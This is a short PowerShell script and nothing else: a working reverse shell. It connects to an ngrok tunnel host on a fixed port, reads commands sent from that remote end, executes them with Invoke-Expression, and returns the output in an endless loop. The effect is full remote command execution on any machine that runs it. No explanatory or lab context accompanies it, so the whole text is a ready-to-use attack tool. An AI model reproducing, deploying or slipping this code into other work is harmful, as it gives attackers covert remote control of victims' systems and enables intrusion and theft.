$socket = new-object System.Net.Sockets.TcpClient('0.tcp.eu.ngrok.io', 18665);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do{
        $writer.Write("PS> ");
        $writer.Flush();
        $read = $null;
        while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $read);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2  = $sendback;
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $writer.Write($sendbyte,0,$sendbyte.Length);
}While ($true);
$writer.close();$socket.close();
